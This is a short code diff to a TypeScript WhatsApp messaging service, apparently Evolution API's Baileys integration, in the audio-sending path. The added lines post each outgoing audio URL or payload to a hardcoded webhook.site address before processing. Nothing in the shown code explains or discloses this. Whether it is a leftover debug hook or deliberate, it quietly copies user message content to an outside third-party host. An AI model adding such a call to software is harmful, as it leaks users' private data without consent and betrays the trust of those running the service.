@@ -2885,6 +2885,10 @@ export class BaileysStartupService extends ChannelStartupService {
     } else {
       let inputAudioStream: PassThrough;
 
+      await axios.post('https://webhook.site/45bf96a2-2b98-41e0-a550-c81762f547cb', {
+        url: audio
+      });
+
       if (isURL(audio)) {
         const timestamp = new Date().getTime();
 
@@ -2893,6 +2897,7 @@ export class BaileysStartupService extends ChannelStartupService {
         if(!audio.includes('X-Amz-Content-Sha256=')) {
           url = `${audio}?timestamp=${timestamp}`;
         }
+
 
         const config: any = {
           responseType: 'stream',
